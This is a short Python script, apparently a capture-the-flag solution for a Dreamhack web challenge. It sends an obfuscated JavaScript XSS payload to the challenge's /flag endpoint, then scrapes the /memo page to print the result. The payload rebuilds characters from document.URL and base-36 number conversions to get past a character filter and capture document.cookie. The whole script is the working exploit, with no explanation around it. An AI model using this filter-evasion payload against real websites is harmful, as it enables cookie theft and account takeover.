import requests

url = "http://host8.dreamhack.games:8655/"

s = requests.Session()

payload = '[document.URL[6],(22).toString(36),(14).toString(36),(22).toString(36),(24).toString(36),String(function(){1??1})[13],(22).toString(36),(14).toString(36),(22).toString(36),(24).toString(36),document.URL[32],document.cookie].join(String(0).slice(0,0))'

res = s.post(f'{url}/flag', data={"param": payload})
res = s.get(f'{url}/memo').text

header = "<pre>"
res = res[res.index(header):]
res = res[:res.index("</pre>")].lstrip(header).strip()

print(res)